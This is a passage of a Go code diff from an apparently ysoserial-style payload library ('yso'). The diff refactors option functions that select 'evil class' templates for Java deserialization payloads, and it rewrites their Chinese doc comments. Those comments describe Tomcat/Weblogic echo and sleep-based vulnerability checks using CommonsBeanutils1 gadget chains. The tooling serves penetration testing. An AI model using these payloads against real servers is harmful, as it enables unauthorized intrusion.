 func SetMultiEchoEvilClass() GenClassOptionFun {
+	ct := ClassMultiEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassMultiEcho
+		config.ClassType = ct
 	}
 }
 
 // GenMultiEchoClassObject
 // GenerateMultiEchoEvilClassObject 生成一个使用 MultiEcho 类模板的javaclassparser.ClassObject对象，主要用于 Tomcat/Weblogic 回显，
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // body 回显
@@ -876,8 +1112,9 @@ func GenMultiEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.Cla
 // yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetClassHeaderEchoTemplate() GenClassOptionFun {
+	ct := ClassMultiEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassMultiEcho
+		config.ClassType = ct
 		config.SetParam(ClassParamPosition, "header")
 		config.SetParam(ClassParamAction, "echo")
 	}
@@ -891,8 +1128,9 @@ func SetClassHeaderEchoTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useHeaderEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
 // ```
 func SetHeaderEchoEvilClass() GenClassOptionFun {
+	ct := ClassMultiEcho
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassMultiEcho
+		config.ClassType = ct
 		config.SetParam(ClassParamPosition, "header")
 		config.SetParam(ClassParamAction, "echo")
 	}
@@ -900,8 +1138,13 @@ func SetHeaderEchoEvilClass() GenClassOptionFun {
 
 // GenHeaderEchoClassObject
 // GenerateHeaderEchoClassObject 生成一个使用HeaderEcho类模板的javaclassparser.ClassObject对象，
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // headerClassObj,_ = yso.GenerateHeaderEchoClassObject(yso.useHeaderParam("Echo","Header Echo Check"))
@@ -917,8 +1160,9 @@ func GenHeaderEchoClassObject(options ...GenClassOptionFun) (*javaclassparser.Cl
 // yso.GetCommonsBeanutils1JavaObject(yso.useSleepTemplate(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 // ```
 func SetClassSleepTemplate() GenClassOptionFun {
+	ct := ClassSleep
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassSleep
+		config.ClassType = ct
 	}
 }
 
@@ -930,15 +1174,21 @@ func SetClassSleepTemplate() GenClassOptionFun {
 // yso.GetCommonsBeanutils1JavaObject(yso.useSleepEvilClass(),yso.useSleepTime(5)) // 发送生成的 Payload 后，观察响应时间是否大于 5s
 // ```
 func SetSleepEvilClass() GenClassOptionFun {
+	ct := ClassSleep
 	return func(config *ClassGenConfig) {
-		config.ClassType = ClassSleep
+		config.ClassType = ct
 	}
 }
 
 // GenSleepClassObject
 // GenerateSleepClassObject 生成一个使用Sleep类模板的javaclassparser.ClassObject对象
-// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
-// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
+// 参数:
+//   - options: 一组可选的 GenClassOptionFun 函数，用于进一步定制生成的Java对象
+//
+// 返回值:
+//   - 生成的 javaclassparser.ClassObject 对象
+//   - 错误信息，失败时非 nil
+//
 // Example:
 // ```
 // yso.GenerateSleepClassObject(yso.useSleepTime(5))
